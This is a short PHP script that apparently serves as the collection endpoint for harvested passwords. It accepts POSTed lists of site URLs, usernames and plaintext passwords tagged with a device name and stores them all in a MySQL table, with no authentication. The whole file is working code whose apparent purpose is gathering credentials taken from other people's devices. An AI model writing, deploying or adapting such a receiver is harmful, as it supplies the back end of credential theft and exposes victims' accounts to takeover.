<?php
	if(isset($_POST["secretInfoPasses"]) && isset($_POST["devName"])) {
		include("conf.php");
		$timeDate=gmdate("d/m/Y")."\t".gmdate("h:i a");
		$conn=new mysqli($server, $username, $password, $db);
		$sql="INSERT INTO ".$table."(`Extra`, `Time`, `URL`, `Username`, `Password`) VALUES (?, ?, ?, ?, ?)";
		$dev_name=$_REQUEST["devName"];
		$passData=json_decode($_POST["secretInfoPasses"]);
		if(!$conn->connect_errno) {
			if($query=$conn->prepare($sql)) {
				foreach($passData as $entry) {
					$addr=base64_encode($entry->url);
					$query->bind_param("sssss", $dev_name, $timeDate, $addr, $entry->username, $entry->password);
					$query->execute();
				}
			}	
			$conn->close();
			print("Success!");
		}
	}
?>